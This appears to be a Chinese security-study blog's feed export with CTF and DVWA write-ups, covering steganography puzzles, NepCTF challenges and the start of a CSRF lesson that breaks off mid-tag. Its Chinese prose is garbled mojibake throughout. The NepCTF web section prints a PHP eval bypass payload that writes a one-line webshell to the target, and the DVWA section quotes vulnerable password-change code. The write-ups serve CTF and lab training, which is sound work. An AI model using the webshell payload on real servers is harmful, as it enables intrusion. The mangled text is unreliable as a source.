·å¼çœ‹èµ·æ¥æ¯”è¾ƒç¹æ‚ï¼Œ</p><p>ä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„</p><p>æ¯”å¦‚å°è¯•whileå¾ªç¯æ—¶ï¼Œå‡ºç°äº†ä»¥ä¸‹æƒ…å†µï¼š</p><p>æˆ‘æƒ³å®ç°çš„åŠŸèƒ½æ˜¯å°†1èµ‹å€¼ç»™current_numberåï¼Œè¿›å…¥å¾ªç¯ï¼Œç›´åˆ°current_numberå¤§äº5</p><p>è¿™é‡Œæ²¡æœ‰ç©ºæ ¼ï¼ˆä¹Ÿå°±æ˜¯å’Œprintå¯¹é½ï¼‰é€ æˆäº†æ— é™åŠ 1çš„ç”»é¢ã€‚</p><p>ä¿®æ”¹ä¹‹åï¼š</p><p>å‘ç°pythonçœŸçš„å¥½å‘ï¼ˆæœ‰ç‚¹æ— è¯­ï¼‰ï¼Œå¯¹äºå¯¹é½å’Œç©ºæ ¼æœ‰ç€ä¸¥æ ¼çš„è¦æ±‚</p><p>æ¯”å¦‚æ²¡æœ‰éµå®ˆå°±ä¼šå‡ºç°ä»¥ä¸‹ç”»é¢å’Œè‹±æ–‡æç¤º:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IndentationError: unindent does not match any outer indentation level</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019031210572084.png" alt="é—®é¢˜"></p><p>æˆåŠŸæ‰¾åˆ°è§£å†³æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯pycharmè½¯ä»¶æ ¼å¼åŒ–ï¼Œä¸è¿‡æˆ‘å·²ç»åˆ æ‰</p><p>å¦å¤–å°±æ˜¯ç”¨notepad++çš„è§†å›¾é‡Œæ˜¾ç¤ºç©ºæ ¼ï¼Œè§æ–‡ç« ï¼š<a href="https://blog.csdn.net/hhy_csdn/article/details/82263757">https://blog.csdn.net/hhy_csdn/article/details/82263757</a></p><h4 id="ä¼ é€’ä»»æ„æ•°é‡çš„å®å‚"><a href="#ä¼ é€’ä»»æ„æ•°é‡çš„å®å‚" class="headerlink" title="ä¼ é€’ä»»æ„æ•°é‡çš„å®å‚"></a>ä¼ é€’ä»»æ„æ•°é‡çš„å®å‚</h4><p>ä¾‹å¦‚ï¼Œæ¥çœ‹ä¸€ä¸ªåˆ¶ä½œæŠ«è¨çš„å‡½æ•°ï¼Œå®ƒéœ€è¦æ¥å—å¾ˆå¤šé…æ–™ï¼Œä½†æ— æ³•é¢„å…ˆç¡®å®šé¡¾å®¢è¦å¤šå°‘ç§é…æ–™ã€‚</p><p>ä¸‹é¢çš„å‡½æ•°åªæœ‰ä¸€ä¸ªå½¢å‚*toppings,ä½†ä¸ç®¡è°ƒç”¨è¯­å¥æä¾›äº†å¤šå°‘å®å‚ï¼Œè¿™ä¸ªå½¢å‚ä¼šå°†å®ƒä»¬ç»Ÿç»Ÿæ”¶å…¥å›Šä¸­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def make_pizza(*toppings):</span><br><span class="line">&quot;&quot;&quot;æ‰“å°é¡¾å®¢ç‚¹çš„æ‰€æœ‰é…æ–™ã€‚&quot;&quot;&quot;</span><br><span class="line">print(toppings)</span><br><span class="line">make_pizza(&#39;pepproni&#39;)</span><br><span class="line">make_pizza(&#39;mushrooms&#39;,&#39;green peppers&#39;,&#39;extra cheese&#39;)</span><br></pre></td></tr></table></figure><p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(142).png"></p><p>pythonä¸­è¿ç®—ä¼˜å…ˆçº§é¡ºåºä¸º NOTã€ANDã€ORã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–°æ‰‹åŒº</title>
      <link href="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/"/>
      <url>/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="stegnao"><a href="#stegnao" class="headerlink" title="stegnao"></a>stegnao</h4><p>æ‰“å¼€åæ–‡æ¡£å¦‚å›¾</p><p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(120).png"></p><p>æ˜æ˜¾æ²¡æœ‰flagï¼Œè¯•ç€ç”¨ç¼–è¾‘å™¨çœ‹äº†ä¸‹ï¼Œæ‰¾åˆ°éšå«æ–‡å­—</p><p>Creator(LaTeX /o/)/Producer(find mr.morse text)/Keywords(Could this be the flag? : Tm9wZSAsIG5vdCBoZXJlIDspCg==)</p><p>çœ‹ä¸Šå»åƒæ˜¯base64ï¼Œè§£ç åæœç„¶æ²¡é‚£ä¹ˆç®€å•ï¼Œæç¤ºä¿¡æ¯flagä¹Ÿä¸åœ¨è¿™é‡Œ</p><p>é‚£ä¹ˆæˆ‘ä»¬å†ä»æ–‡æœ¬å‡ºå‘</p><p>ctrl+aååˆ°æ–‡æœ¬ä¸­ï¼Œæœ‰çº¿ç´¢äº†ï¼</p><p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(121).png"></p><p>å‡ºç°äº†è¯¸å¦‚BAçš„æ’åˆ—ç»„åˆï¼Œè”æƒ³åˆ°ä¹‹å‰çš„æ–‡å­—é‡Œï¼š**(find mr.morse text)**æç¤ºæˆ‘ä»¬æ‘©æ–¯ç”µç </p><p>è¿™é‡Œåˆšå¥½è«æ–¯ç”µç å°±æ˜¯ä»¥ - å’Œ . æ¥è¡¨è¾¾ä¿¡æ¯çš„ï¼Œäºæ˜¯æˆ‘ä»¬è¿›è¡Œæ›¿æ¢</p><p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(122).png"></p><p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(123).png"></p><p>å¾—åˆ°äº†æ‘©æ–¯ç”µç åï¼Œç›´æ¥ä¸Šåœ¨çº¿ç¼–ç å³å¯</p><p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(124).png"></p><p>å¦‚å›¾ï¼Œflag</p><p>ä¸è¿‡æˆ‘ä»¬è¿˜è¦æŒ‰ç…§é¢˜ç›®è¦æ±‚å°†FLAGåå­—æ¯å°å†™ï¼Œå¾—åˆ°æœ€åè§£ç­”ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ”»é˜²ä¸–ç•Œ_misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nepçš„ç­¾åˆ°é¢˜</title>
      <link href="/2021/03/24/nepnep/nepctf/"/>
      <url>/2021/03/24/nepnep/nepctf/</url>
      
        <content type="html"><![CDATA[<p> è¿™æ¬¡å¼€å¼€å¿ƒå¿ƒå‚åŠ æ¯”èµ›ï¼Œéš¾è¿‡å…³æ‰æ¯”èµ›é¡µé¢(å¤ªcaiäº†)</p><p>è®²è®²ä¸‰ä¸ªæ–¹é¢ç­¾åˆ°é¢˜</p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>é¶æœºé“¾æ¥ï¼š<a href="http://d9a55425-604b-45a0-8ee4-14b465f2c65a.node1.hackingfor.fun/1b5337d0c8ad813197b506146d8d503d/">http://d9a55425-604b-45a0-8ee4-14b465f2c65a.node1.hackingfor.fun/1b5337d0c8ad813197b506146d8d503d/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  error_reporting(0);</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">  $nep &#x3D; $_GET[&#39;nep&#39;];</span><br><span class="line">  $len &#x3D; $_GET[&#39;len&#39;];</span><br><span class="line">  if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13)&#123;</span><br><span class="line">    eval(substr($nep,0,$len));</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    die(&#39;too long!&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜æ˜¯ä¼ å‚ï¼Œä¹Ÿå°±æ˜¯è¦ç”¨è¯­å¥å†™å‡ºpayload</p><p>payload:    ?len=-1&amp;nep=<code>$_GET[1]</code>;1&amp;1=echo &lt;?php eval($_POST[1]);&gt;2.php</p><p>æˆ‘è‡ªå·±çš„ç†è§£å°±æ˜¯ï¼Œä¼ ä¸Šlenå’Œnepä¸¤ä¸ªé‡ï¼Œå…¶ä¸­len=-1ç»•è¿‡å‡½æ•°ï¼Œç›´æ¥åˆ°ä¸‹ä¸€ä¸ªé‡</p><p>è€Œnepé‡ä¼ å‚ï¼Œèµ‹å€¼è¯­å¥ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶ä¸”è¦åŠ ä¸Šåæ–œæ ï¼Œä½¿å¾—è¯­å¥ä¸ä¼šè¢«è¿‡æ»¤ã€‚</p><p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(114).png"></p><p><img src="/2021/03/24/nepnep/nepctf/Users/David/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(118).png"></p><p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(115).png"></p><p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(116).png"></p><p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(117).png"></p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><p>å•Šï¼Œå…¶å®å¾ˆç®€å•å•Š</p><p>å¥½æ°”ï¼ŒçœŸçš„å°±æ˜¯åªè¦çœ‹å‡ºå›¾å½¢å°±å¥½ï¼Œæˆ‘ç¼–ç è§£ç åŠå¤©å¿ƒç´¯</p><p>è¿™é‡Œç”¨äº†ä¸€ä¸ªç¥å¥‡ç½‘ç«™ï¼š<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p><p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(113).png"></p><h4 id="cyber"><a href="#cyber" class="headerlink" title="cyber"></a>cyber</h4><p>è¿™é‡Œç¢°åˆ°äº†çŸ¥è¯†ç›²åŒºï¼š</p><p>çŒªåœˆå¯†ç ï¼ŒéŸ³ç¬¦å¯†ç </p><p>çœ‹åˆ°å®è—æ–‡ç« ï¼š<a href="https://blog.csdn.net/Amherstieae/article/details/111134283">https://blog.csdn.net/Amherstieae/article/details/111134283</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> nep </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nep_MISC</title>
      <link href="/2021/03/15/nepnep/nep%E9%A2%98/"/>
      <url>/2021/03/15/nepnep/nep%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p> è§£é¢˜è¿‡ç¨‹æ€è·¯æ¥è‡ªäº<a href="https://blog.csdn.net/Nebula1805/article/details/113833930">https://blog.csdn.net/Nebula1805/article/details/113833930</a></p><h5 id="å±æ€§-jpg"><a href="#å±æ€§-jpg" class="headerlink" title="å±æ€§.jpg"></a>å±æ€§.jpg</h5><p>ç­¾åˆ°é¢˜ï¼Œä¾é¢˜æ„å°†å›¾ç‰‡ä¿å­˜åæŸ¥çœ‹å±æ€§ï¼Œå¾—åˆ°flag.</p><p><img src="/2021/03/15/nepnep/nep%E9%A2%98/%E5%B1%9E%E6%80%A7.jpg"></p><h5 id="sring-jpg"><a href="#sring-jpg" class="headerlink" title="sring.jpg"></a>sring.jpg</h5><p>æœ¬æ¥æƒ³æŒ‰ç…§ä¸Šé¢˜è§£ï¼Œç»“æœå‘ç°å±æ€§é‡Œç©ºç©ºå¦‚ä¹Ÿ</p><p>åŸæ¥è¿™æ˜¯è¦ç”¨åˆ°kalié‡Œçš„stringæŒ‡ä»¤</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>strings file</code><br>è¾“å…¥å‘½ä»¤<code>strings strings.jpg</code></p><p><img src="https://img-blog.csdnimg.cn/20210217143330255.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="grep-jpg"><a href="#grep-jpg" class="headerlink" title="grep.jpg"></a>grep.jpg</h5><p>ä¸€æ‰“å¼€é™„ä»¶ï¼Œç«Ÿç„¶æ˜¯å¥½åº·çš„å›¾ï¼ˆæ»‘ç¨½ï¼‰</p><p>è§£é¢˜é‡è¦</p><p>ç”¨æ³•: <code>grep [é€‰é¡¹]... æ¨¡å¼ [æ–‡ä»¶]...</code><br>è¾“å…¥å‘½ä»¤ <code>grep -a &#39;BJD&#39; grep.jpeg</code></p><p>åŒæ ·åœ¨kalié‡Œå®ç°</p><h5 id="aaa-gif"><a href="#aaa-gif" class="headerlink" title="aaa.gif"></a>aaa.gif</h5><p>o,æ˜¯è¿™ä¹ˆç»å…¸çš„é¼“æŒ</p><p>çœ‹åˆ°é—ªè¿‡çš„flagå›¾ç‰‡</p><p>Stegsolveå·¥å…·æŸ¥çœ‹ï¼Œç‚¹å‡»Analyse-&gt;Frame Browser(å¸§æµè§ˆå™¨),æŸ¥çœ‹æ¯ä¸€å¸§</p><p>å°±å¾—åˆ°ä¸‰å¼ å…³äºflagå›¾ç‰‡</p><h5 id="lsb-png"><a href="#lsb-png" class="headerlink" title="lsb.png"></a>lsb.png</h5><p>åŒæ ·ç”¨Stegsolveå·¥å…·æŸ¥çœ‹ï¼Œåˆ‡æ¢é€šé“<br><a href="https://www.cnblogs.com/cat47/p/11483478.html">stegsolveä½¿ç”¨æ–¹æ³•</a></p><p><img src="https://img-blog.csdnimg.cn/20210217151442405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/20210217151458817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/20210217151516928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è§‚å¯Ÿåˆ°redï¼Œgreenï¼Œblue 0ä½å¯èƒ½éšè—ç€ä¿¡æ¯<br>Analyse-&gt;Data Extract,å‹¾é€‰redï¼Œgreenï¼Œblue 0ä½<br><img src="https://img-blog.csdnimg.cn/20210217153101363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç‚¹å‡»Preview<br><img src="https://img-blog.csdnimg.cn/20210217153156855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è§‚å¯Ÿåˆ°æ˜¯pngæ ¼å¼ï¼Œsave binä»¥ pngä¸ºåç¼€å<img src="https://img-blog.csdnimg.cn/20210217153310561.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾—åˆ°ä¸€å¼ äºŒç»´ç <br><img src="https://img-blog.csdnimg.cn/20210217153439273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰«ç ï¼Œå¾—åˆ°flag<img src="https://img-blog.csdnimg.cn/20210217154107314.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="ä¸Šè¯¾è®¤çœŸå¬äº†å—"><a href="#ä¸Šè¯¾è®¤çœŸå¬äº†å—" class="headerlink" title="ä¸Šè¯¾è®¤çœŸå¬äº†å—"></a>ä¸Šè¯¾è®¤çœŸå¬äº†å—</h5><p>æ ¹æ®æç¤ºï¼Œflagåœ¨udp,http,tcpä¸‰ç§æµé‡ä¸­ï¼Œç”¨wiresharkæ‰“å¼€æ–‡ä»¶ï¼Œåˆ†åˆ«ç”¨è¿‡æ»¤å™¨é”å®šä¸‰ç§æµé‡ï¼Œå¹¶ä»¥<code>flag&#123;</code> æ ¼å¼æŸ¥æ‰¾<br><img src="https://img-blog.csdnimg.cn/20210218162223708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20210218161704740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20210218161834397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰€ä»¥flagä¸ºflag{25434026}</p><h5 id="å›¾ç‰‡Base64ç¼–ç "><a href="#å›¾ç‰‡Base64ç¼–ç " class="headerlink" title="å›¾ç‰‡Base64ç¼–ç "></a>å›¾ç‰‡Base64ç¼–ç </h5><p>ç›´æ¥åœ¨çº¿Base64è½¬ç å›¾ç‰‡ï¼Œæ‰«æäºŒç»´ç å¾—åˆ°flag</p><h5 id="Baseç¼–ç "><a href="#Baseç¼–ç " class="headerlink" title="Baseç¼–ç "></a>Baseç¼–ç </h5><p>é‡‡ç”¨äº†å…ˆbase32å†åˆ°base64çš„è¿‡ç¨‹</p><h5 id="16è¿›åˆ¶æŸ¥çœ‹"><a href="#16è¿›åˆ¶æŸ¥çœ‹" class="headerlink" title="16è¿›åˆ¶æŸ¥çœ‹"></a>16è¿›åˆ¶æŸ¥çœ‹</h5><p>ä½¿ç”¨äº†ctfå·¥å…·åŒ…é‡Œçš„å·¥å…·ç›´æ¥è¿›è¡ŒæŸ¥çœ‹ï¼Œflagä½äºæœ€åå‡ è¡Œ</p><h5 id="zipä¼ªåŠ å¯†"><a href="#zipä¼ªåŠ å¯†" class="headerlink" title="zipä¼ªåŠ å¯†"></a>zipä¼ªåŠ å¯†</h5><p>è¿™é¢˜å¾ˆå¥‡æ€ªï¼Œæˆ‘ç›´æ¥ç»•è¿‡äº†å¯†ç ï¼Œæ‰“å¼€flag.txtæ–‡ä»¶</p><p>åæ¥é‡æ–°å‡ æ¬¡ä¸‹è½½å†ç”¨å·¥å…·éƒ½æç¤ºæœªæœ‰åŠ å¯†æ–‡ä»¶</p>]]></content>
      
      
      
        <tags>
            
            <tag> nep </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csrf</title>
      <link href="/2021/02/22/dvwa/csrf/"/>
      <url>/2021/02/22/dvwa/csrf/</url>
      
        <content type="html"><![CDATA[<p><strong>è·¨ç«™è¯·æ±‚ä¼ªé€ </strong>ï¼ˆè‹±è¯­ï¼šCross-site request forgeryï¼‰</p><p>æ„Ÿè§‰ä¼¼æ›¾ç›¸è¯†ï¼Œç›´åˆ°çœ‹åˆ°ä¸‹é¢çš„è¯:</p><p>è·Ÿ<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC/23316003">è·¨ç½‘ç«™è„šæœ¬</a>ï¼ˆXSSï¼‰ç›¸æ¯”ï¼Œ<strong>XSS</strong> åˆ©ç”¨çš„æ˜¯ç”¨æˆ·å¯¹æŒ‡å®šç½‘ç«™çš„ä¿¡ä»»ï¼ŒCSRF åˆ©ç”¨çš„æ˜¯<a href="https://baike.baidu.com/item/%E7%BD%91%E7%AB%99/155722">ç½‘ç«™</a>å¯¹ç”¨æˆ·<a href="https://baike.baidu.com/item/%E7%BD%91%E9%A1%B5%E6%B5%8F%E8%A7%88%E5%99%A8/8309940">ç½‘é¡µæµè§ˆå™¨</a>çš„ä¿¡ä»»ã€‚</p><p>è·¨ç«™è¯·æ±‚æ”»å‡»ï¼Œç®€å•åœ°è¯´ï¼Œæ˜¯æ”»å‡»è€…é€šè¿‡ä¸€äº›æŠ€æœ¯æ‰‹æ®µæ¬ºéª—ç”¨æˆ·çš„æµè§ˆå™¨å»è®¿é—®ä¸€ä¸ªè‡ªå·±æ›¾ç»è®¤è¯è¿‡çš„ç½‘ç«™å¹¶è¿è¡Œä¸€äº›æ“ä½œï¼ˆå¦‚å‘é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç”šè‡³è´¢äº§æ“ä½œå¦‚è½¬è´¦å’Œè´­ä¹°å•†å“ï¼‰ã€‚ç”±äºæµè§ˆå™¨æ›¾ç»è®¤è¯è¿‡ï¼Œæ‰€ä»¥è¢«è®¿é—®çš„ç½‘ç«™ä¼šè®¤ä¸ºæ˜¯çœŸæ­£çš„ç”¨æˆ·æ“ä½œè€Œå»è¿è¡Œã€‚è¿™åˆ©ç”¨äº†webä¸­ç”¨æˆ·èº«ä»½éªŒè¯çš„ä¸€ä¸ªæ¼æ´ï¼š<strong>ç®€å•çš„èº«ä»½éªŒè¯åªèƒ½ä¿è¯è¯·æ±‚å‘è‡ªæŸä¸ªç”¨æˆ·çš„æµè§ˆå™¨ï¼Œå´ä¸èƒ½ä¿è¯è¯·æ±‚æœ¬èº«æ˜¯ç”¨æˆ·è‡ªæ„¿å‘å‡ºçš„</strong>ã€‚</p><p>å•Šï¼Œè¿™æ ·ä¸ä»¥å‰åœ¨ç”µè„‘å’Œæ‰‹æœºä¸Šçœ‹è§é‚£äº›ä¸æ€€å¥½æ„çš„é“¾æ¥ï¼ˆåˆ«é—®æˆ‘æ€ä¹ˆçœ‹å‡ºæ¥çš„ï¼‰ï¼Œå°±æ˜¯è¯±å¯¼å•çº¯çš„äººå»ç‚¹ï¼ŒåŸæ¥æœ‰è¿™ä¹ˆé«˜å¤§ä¸Šçš„åå­—ï¼Œæœ‰ç‚¹å°å°´å°¬ï¼Œä¹‹å‰æˆ‘éƒ½æŒ‰æœ¨é©¬æ¥ç†è§£â€¦â€¦</p><p>å¯¹äºdvwaçš„csrfè¿™å…³ï¼Œæˆ‘æŸ¥é˜…äº†å‡ ç¯‡åšå®¢ã€‚</p><h2 id="Low"><a href="#Low" class="headerlink" title="**Low*\***"></a><strong><em>*</em>*Low*\</strong>***</h2><p>æœåŠ¡å™¨ç«¯æ ¸å¿ƒä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line"></span><br><span class="line">    $pass_new  &#x3D; $_GET[ &#39;password_new&#39; ]; </span><br><span class="line"></span><br><span class="line">    $pass_conf &#x3D; $_GET[ &#39;password_conf&#39; ]; </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; Do the passwords match? </span><br><span class="line"></span><br><span class="line">    if( $pass_new &#x3D;&#x3D; $pass_conf ) &#123; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; They do! </span><br><span class="line"></span><br><span class="line">        $pass_new &#x3D; mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new &#x3D; md5( $pass_new ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Update the database </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $insert &#x3D; &quot;UPDATE &#96;users&#96; SET password &#x3D; &#39;$pass_new&#39; WHERE user &#x3D; &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $result &#x3D; mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         &#x2F;&#x2F; Feedback for the user </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    else &#123; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Issue with passwords matching </span><br><span class="line"></span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p> å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨æ”¶åˆ°ä¿®æ”¹å¯†ç çš„è¯·æ±‚åï¼Œä¼šæ£€æŸ¥å‚æ•°password_newä¸password_confæ˜¯å¦ç›¸åŒï¼Œå¦‚æœç›¸åŒï¼Œå°±ä¼šä¿®æ”¹å¯†ç ï¼Œå¹¶æ²¡æœ‰ä»»ä½•çš„é˜²CSRFæœºåˆ¶ï¼ˆå½“ç„¶æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å‘é€è€…æ˜¯åšäº†èº«ä»½éªŒè¯çš„ï¼Œæ˜¯æ£€æŸ¥çš„cookieï¼Œåªæ˜¯è¿™é‡Œçš„ä»£ç æ²¡æœ‰ä½“ç°= =ï¼‰ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="**æ¼æ´åˆ©ç”¨*\***"></a><strong><em>*</em>*æ¼æ´åˆ©ç”¨*\</strong>***</h2><p>1ã€æ„é€ é“¾æ¥</p><p>A) æœ€åŸºç¡€çš„:</p><p><a 